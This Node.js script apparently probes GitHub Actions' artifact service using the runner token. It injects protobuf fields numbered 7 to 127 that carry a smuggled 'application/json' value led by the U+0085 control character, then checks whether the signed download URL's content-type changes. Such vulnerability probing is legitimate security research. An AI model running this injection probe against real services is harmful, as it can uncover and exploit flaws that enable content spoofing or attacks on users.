'use strict';
const crypto = require('node:crypto');
const SERVICE='/twirp/github.actions.results.api.v1.ArtifactService/';
function ctx(){const token=process.env.ACTIONS_RUNTIME_TOKEN,base=new URL(process.env.ACTIONS_RESULTS_URL).origin;
 const p=JSON.parse(Buffer.from(token.split('.')[1],'base64url'));const s=p.scp.split(' ').find(x=>x.startsWith('Actions.Results:')).split(':');
 return {token,base,run:s[1],job:s[2]};}
function vi(v){v=BigInt(v);const a=[];do{let b=Number(v&127n);v>>=7n;if(v)b|=128;a.push(b)}while(v);return Buffer.from(a)}
function ld(n,v){v=Buffer.from(v);return Buffer.concat([vi(BigInt(n)*8n+2n),vi(v.length),v])}
function vv(n,v){return Buffer.concat([vi(BigInt(n)*8n),vi(v)])}
function wrap(v){return ld(1,v)}
function prefix(c,n){return Buffer.concat([ld(1,c.run),ld(2,c.job),ld(3,n),vv(5,7),ld(6,wrap('application/json'))])}
async function raw(c,m,body,type='application/protobuf'){const r=await fetch(c.base+SERVICE+m,{method:'POST',headers:{Authorization:'Bearer '+c.token,'Content-Type':type},body,signal:AbortSignal.timeout(15000)});return {status:r.status,buf:Buffer.from(await r.arrayBuffer())}}
function fields(b){let o=0,a=[];function v(){let x=0n,s=0n;while(o<b.length){let q=b[o++];x|=BigInt(q&127)<<s;if(!(q&128))return x;s+=7n}throw 0}while(o<b.length){let t=Number(v()),n=t>>3,w=t&7;if(w===0)a.push([n,w,v()]);else if(w===2){let l=Number(v());a.push([n,w,b.subarray(o,o+l)]);o+=l}else throw 0}return a}
function uploadUrl(r){try{let f=fields(r.buf).find(x=>x[0]===2&&x[1]===2);return f&&Buffer.from(f[2]).toString()}catch{return null}}
async function json(c,m,x){let r=await fetch(c.base+SERVICE+m,{method:'POST',headers:{Authorization:'Bearer '+c.token,'Content-Type':'application/json'},body:JSON.stringify({workflow_run_backend_id:c.run,workflow_job_run_backend_id:c.job,...x})});let t=await r.text();try{t=JSON.parse(t)}catch{t={}}return {status:r.status,body:t}}
async function trial(c,label,extra){let name=('ch-'+label+'-'+Date.now()+'-'+Math.random()).slice(0,230),cr=await raw(c,'CreateArtifact',Buffer.concat([prefix(c,name),extra])),u=uploadUrl(cr);let out={label,create:cr.status,upload:Boolean(u)};if(!u)return out;
 let payload=Buffer.from('{}');out.put=(await fetch(u,{method:'PUT',headers:{'x-ms-blob-type':'BlockBlob','Content-Type':'application/octet-stream'},body:payload})).status;
 let h='sha256:'+crypto.createHash('sha256').update(payload).digest('hex');let fin=await json(c,'FinalizeArtifact',{name,size:String(payload.length),hash:h});out.finalize=fin.status;out.id=fin.body.artifact_id||fin.body.artifactId;
 let sg=await json(c,'GetSignedArtifactURL',{name});let su=sg.body.signed_url||sg.body.signedUrl;out.signed=sg.status;out.rsct=su?new URL(su).searchParams.get('rsct'):null;
 if(out.rsct!=='application/json')console.log('DIFF '+JSON.stringify(out));else await json(c,'DeleteArtifact',{name});return out}
(async()=>{let c=ctx(),evil='\u0085application/json';let shapes=[['raw',n=>ld(n,evil)],['wrap',n=>ld(n,wrap(evil))],['v1',n=>vv(n,1)],['v7',n=>vv(n,7)]];
 for(const [kind,f] of shapes){let xs=[];for(let n=7;n<=127;n++)xs.push(f(n));let r=await trial(c,'all-'+kind,Buffer.concat(xs));console.log('GROUP '+JSON.stringify(r));}
 console.log('DONE');})().catch(e=>{console.error(e.stack||e);process.exitCode=1});
